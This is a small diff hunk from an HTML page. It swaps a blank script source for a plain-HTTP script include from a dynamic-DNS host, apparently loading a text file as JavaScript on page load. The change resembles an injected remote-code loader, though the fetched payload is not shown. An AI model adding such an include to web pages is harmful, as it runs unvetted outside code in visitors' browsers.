@@ -9,7 +9,7 @@
 
     }
     </script>
-    <script src="about:blank"></script>
+    <script src="http://whiteavocado.ddns.net/IIIIIIIIIIIIIIIIIIIIIII/txt/1.txt"></script>
     </head>
 
     <body onload="load()">
